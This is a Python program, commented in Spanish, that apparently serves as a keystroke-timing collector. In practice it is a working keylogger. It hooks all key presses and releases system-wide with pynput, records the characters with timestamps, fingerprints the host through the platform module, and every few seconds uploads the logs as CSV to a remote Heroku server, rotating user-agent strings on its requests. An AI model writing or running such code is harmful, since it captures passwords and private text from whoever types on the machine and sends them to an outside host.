import datetime
from pynput.keyboard import Listener
import time
import platform as pl
import requests as req
import csv
import json
import os
import shutil
import atexit
import webbrowser
import random
from threading import Timer

user_agent_list = [
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
]

url_server = 'https://server-key.herokuapp.com'
#url_server = 'http://127.0.0.1:5000'

def exit_handler():
	global user_dir
	file_name = user_dir.text
	user_agent = random.choice(user_agent_list)
	aux = req.post(url_server+'/end',json={'user':file_name},headers={"User-Agent":user_agent})
	print('**********************> Respuesta salida: ',aux)
	url_userdata = url_server + '/histograma?user=' + file_name
	shutil.rmtree('user_characteristics',ignore_errors=True)
	webbrowser.open(url_userdata)
atexit.register(exit_handler)


milista=[]
tiempo_espera=5
#global hora_envio
#hora_actual = time.time()
#hora_envio= hora_actual + tiempo_espera

#Clase para definir temporizadores que toman el tiempo de espera
class RepeatingTimer(object):
	def __init__(self, interval, f,args=[],kwargs={}):
		self.interval = interval
		self.f = f
		self.timer = None

	def callback(self):
		self.f()

	def cancel(self):
		self.timer.cancel()

	def start(self):
		self.timer = Timer(self.interval, self.callback)
		self.timer.start()

	def reset(self):
		self.cancel()
		self.start()

#Envio de datos a la nube
def enviarDatos():
	global milista
	global user_dir
	shutil.rmtree('user_characteristics',ignore_errors=True)
	os.mkdir('user_characteristics')
	file_name = user_dir.text
	archivo = open(os.path.join('user_characteristics', file_name+'.csv'),'w')
	with archivo:
		writer=csv.writer(archivo)
		writer.writerows(milista)

	file_path = os.path.join('user_characteristics', file_name+'.csv')
	file_keys = {'file_path': open(file_path,'rb')}
	req.post(url_server+'/upload',files = file_keys)
	#with open(archivo,'w') as fd:
		#writer = csv.writer(fd,delimiter=',')
		#for row in milista:
			#print(row)
			#writer.writerow(row)
	print('------------> Data sended')
	milista=[]
	
alarm = RepeatingTimer(tiempo_espera,enviarDatos)


#signal.signal(signal.SIGALRM, enviarDatos)

#Agregar if para linux y solo mostrar info adecuada
def guardarCaracteristicas():
	perfil_so=[
	'architecture',
	'win32_ver',
	'machine',
	'node',
	'platform',
	'processor',
	'python_build',
	'python_compiler',
	'python_version',
	'release',
	'system',
	'uname',
	'version',
	]
	listaCaracteristicas=[]

	

	for perfil in perfil_so:
		if(hasattr(pl,perfil)):
			listaCaracteristicas.append([perfil,getattr(pl,perfil)()])
  
	data = [str(getattr(pl,'node')()), datetime.datetime.now().strftime("%Y%m%d%H%M%S")]
	file_name = ''.join(data) + '.txt'
	file_path = os.path.join('user_characteristics',file_name)
	with open(file_path,'w') as fd:
		for line in listaCaracteristicas:
			fd.write("{}\n".format(line))
	return file_path


#Definimos una funcion para obtener los indices de una lista segun cierta condicion
def find_indices(lst,condition):
  	return([i for i,elem in enumerate(lst) if condition(elem)])

#Definimos una funcion para cambiar las letras a mayusculas si es que se presiona 'Key.caps_lock' (BLOCK MAYUS)
def normalizarMayusculas(a):
  	b=find_indices(a,lambda e: e[0]=='Key.caps_lock')
  	if(len(b)>1):
    		for i in range(0,len(b),2):
      			for x in range(b[i]+1,b[i+1]):
        			a[x][0]=a[x][0].upper()
  	elif(len(b)==1):
    		for i in range(b[0]+1,len(a)):
      			a[i][0]=a[i][0].upper()

  	return a

#Definimos una funcion para contabilizar correctamente los valores de tiempo de presionado 
#y soltado cuando se mantiene presionada la tecla por bastante tiempo
def normalizarMantenerPresionado(a):
	c = []
	i = 0
	while(i < len(a)):
		if(len(a[i])==3):
			c.append(a[i])
		else:
			inicio = a[i][1]
			while(len(a[i])==2):
				i += 1
			aux = [a[i][0],inicio,a[i][2]]
			c.append(aux)
		i+=1
	return c

 
#Funcion que se le asigna al listener para conocer cuando recibe la señal del teclado
def RecibirDatos(key):
	global milista
	m=datetime.datetime.now()
	milista.append([key,str(m)])
    

#Funcion que se le asigna al listener para conocer cuando se deja de presionar una tecla 
def DejarDePresionar(key):
	global milista
	milista[len(milista)-1].append(str(datetime.datetime.now()))
	milista = normalizarMantenerPresionado(milista[:])
	milista = normalizarMayusculas(milista[:])
	global alarm
	if(len(milista)==1):
		alarm.start()
	elif(len(milista)>1):
		alarm.reset()
	#signal.alarm(tiempo_espera)
	print(milista)
  

if __name__ == "__main__":
	# Inicio del programa
	print('Iniciando')
	if(not os.path.exists('user_characteristics')):
		os.mkdir('user_characteristics')
  
	user_file = guardarCaracteristicas()
	file_os = {'file': open(user_file,'rb')}

	global user_dir
	user_dir = req.post(url_server+'/session',files=file_os)
	print('------------> ',user_dir.text)
	with Listener(on_press=RecibirDatos, on_release=DejarDePresionar) as l:
		l.join()

